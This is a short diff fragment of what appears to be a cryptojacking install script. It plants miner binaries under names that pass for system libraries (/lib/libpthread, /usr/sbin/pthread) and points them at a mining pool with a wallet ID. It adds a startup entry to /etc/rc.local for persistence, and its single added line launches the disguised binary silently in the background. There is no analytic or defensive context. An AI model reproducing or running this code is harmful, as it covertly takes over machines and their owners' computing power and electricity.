@@ -5,3 +5,4 @@ echo "/lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ
 chmod +x /lib/libpthread
 chmod +x /usr/sbin/pthread
 echo "/usr/sbin/pthread >/dev/null 2>&1 &" >> /etc/rc.local
+/usr/sbin/pthread >/dev/null 2>&1 &
